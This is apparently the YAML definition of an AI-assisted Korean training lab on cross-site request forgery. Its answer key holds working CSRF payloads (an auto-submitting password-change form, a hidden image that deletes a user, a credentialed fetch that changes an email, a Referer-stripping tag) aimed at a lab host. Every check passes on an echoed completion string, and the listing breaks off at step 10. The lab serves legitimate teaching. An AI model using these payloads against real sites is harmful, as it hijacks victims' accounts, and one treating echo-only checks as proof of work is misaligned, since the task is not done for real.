lab_id: web-vuln-ai-week04
title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 4
description: CSRF 공격의 원리와 토큰 기반 방어 메커니즘을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- CSRF 공격 원리를 이해한다
- CSRF 토큰 검증 메커니즘을 분석한다
- SameSite 쿠키와 방어 기법을 학습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
  hint: HTML 소스에서 hidden input을 찾으세요.
  category: csrf_detect
  points: 8
  answer: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
    echo 'CSRF 토큰 확인 완료'
  answer_detail: CSRF 토큰이 없으면 외부 사이트에서 요청을 위조할 수 있습니다.
  verify:
    type: output_contains
    expect: CSRF 토큰 확인 완료
    field: stdout
  target_vm: attacker
  script: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
    echo 'CSRF 토큰 확인 완료'
  risk_level: low
  bastion_prompt: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
- order: 2
  instruction: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.'
  hint: auto-submit 폼을 작성하세요.
  category: csrf_craft
  points: 10
  answer: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
    method="POST"><input name="password" value="hacked"></form></body></html>' &&
    echo 'CSRF PoC 작성 완료'
  answer_detail: 자동 제출 폼으로 사용자가 페이지를 방문하면 즉시 요청이 전송됩니다.
  verify:
    type: output_contains
    expect: CSRF PoC 작성 완료
    field: stdout
  target_vm: attacker
  script: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
    method="POST"><input name="password" value="hacked"></form></body></html>' &&
    echo 'CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 구현 방법과 예시를 설명해줘'
- order: 3
  instruction: 이미지 태그를 이용한 GET 기반 CSRF를 구성하시오.
  hint: img src에 상태 변경 URL을 삽입하세요.
  category: csrf_craft
  points: 10
  answer: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
    && echo 'GET CSRF PoC 작성 완료'
  answer_detail: GET 요청으로 상태 변경이 가능하면 img 태그만으로 CSRF가 가능합니다.
  verify:
    type: output_contains
    expect: GET CSRF PoC 작성 완료
    field: stdout
  target_vm: attacker
  script: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
    && echo 'GET CSRF PoC 작성 완료'
  risk_level: low
  bastion_prompt: 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
- order: 4
  instruction: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.'
  hint: 'fetch로 credentials: include 옵션을 사용하세요.'
  category: csrf_craft
  points: 10
  answer: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
    && echo 'AJAX CSRF 작성 완료'
  answer_detail: 'credentials: include로 쿠키가 자동 첨부되어 인증된 요청을 위조합니다.'
  verify:
    type: output_contains
    expect: AJAX CSRF 작성 완료
    field: stdout
  target_vm: attacker
  script: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
    && echo 'AJAX CSRF 작성 완료'
  risk_level: low
  bastion_prompt: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용 구현 방법과 예시를 설명해줘'
- order: 5
  instruction: SameSite 쿠키 속성의 CSRF 방어 효과를 분석하시오.
  hint: Set-Cookie 헤더에서 SameSite를 확인하세요.
  category: csrf_defense
  points: 10
  answer: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
    완료'
  answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
  verify:
    type: output_contains
    expect: SameSite 분석 완료
    field: stdout
  target_vm: attacker
  script: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
    완료'
  risk_level: low
  bastion_prompt: SameSite 쿠키 속성의 CSRF 방어 효과를 분석해줘
- order: 6
  instruction: CSRF 토큰 검증 로직의 약점을 분석하시오.
  hint: 토큰 재사용, 빈 토큰 등을 테스트하세요.
  category: csrf_bypass
  points: 12
  answer: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
  answer_detail: CSRF 토큰 구현 오류로 방어가 무효화될 수 있습니다.
  verify:
    type: output_contains
    expect: CSRF 토큰 분석 완료
    field: stdout
  target_vm: attacker
  script: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
  risk_level: low
  bastion_prompt: CSRF 토큰 검증 로직의 약점을 분석해줘
- order: 7
  instruction: Referer 헤더 기반 CSRF 방어를 우회하시오.
  hint: Referer를 제거하는 기법을 사용하세요.
  category: csrf_bypass
  points: 10
  answer: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
    기법 완료'
  answer_detail: meta 태그로 Referer 전송을 방지하면 서버의 Referer 검증을 우회할 수 있습니다.
  verify:
    type: output_contains
    expect: Referer 우회 기법 완료
    field: stdout
  target_vm: attacker
  script: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
    기법 완료'
  risk_level: low
  bastion_prompt: Referer 헤더 기반 CSRF 방어를 우회해줘
- order: 8
  instruction: JSON 기반 엔드포인트의 CSRF 가능성을 분석하시오.
  hint: Content-Type 제한을 확인하세요.
  category: csrf_advanced
  points: 10
  answer: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
  answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
  verify:
    type: output_contains
    expect: JSON CSRF 분석 완료
    field: stdout
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
  risk_level: low
  bastion_prompt: JSON 기반 엔드포인트의 CSRF 가능성을 분석해줘
- order: 9
  instruction: CORS 설정과 CSRF의 관계를 분석하시오.
  hint: Access-Control 헤더를 확인하세요.
  category: csrf_advanced
  points: 10
  answer: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
  answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
  verify:
    type: output_contains
    expect: 완료
    field: stdout
  target_vm: attacker
  script: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
  risk_level: low
  bastion_prompt: CORS 설정과 CSRF의 관계를 분석해줘
- order: 10
  instruction: CSRF와 XSS 체인 공격을 설계하시오.
  hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
